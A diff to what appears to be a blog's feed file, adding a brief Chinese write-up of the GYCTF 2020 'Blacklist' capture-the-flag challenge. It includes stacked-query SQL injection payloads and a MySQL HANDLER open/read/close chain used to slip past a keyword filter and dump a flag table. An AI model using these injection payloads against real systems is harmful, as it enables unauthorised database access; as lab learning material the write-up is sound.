@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>GYCTF:2020-Blacklist</title>
+      <link href="2021/06/17/gyctf-2020-blacklist/"/>
+      <url>2021/06/17/gyctf-2020-blacklist/</url>
+      
+        <content type="html"><![CDATA[<pre><code>1';show columns from `FlagHere`; %23  </code></pre><p><img src="/2021/06/17/gyctf-2020-blacklist/image-20210617211216152.png" alt="image-20210617211216152"></p><p>过滤了这些东西</p><p><img src="/2021/06/17/gyctf-2020-blacklist/image-20210617211254033.png" alt="image-20210617211254033"></p><p>用到handler</p><pre><code>HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT }    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE //其中  HANDLER tbl_name OPEN AS example//其后  HANDLER example READ index_name="example2"</code></pre><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p><pre><code>1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code></pre><p><img src="/2021/06/17/gyctf-2020-blacklist/image-20210617211413055.png" alt="image-20210617211413055"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>GXYCTF:2019-BabyUpload</title>
       <link href="2021/06/16/gxyctf-2019-babyupload/"/>
       <url>2021/06/16/gxyctf-2019-babyupload/</url>
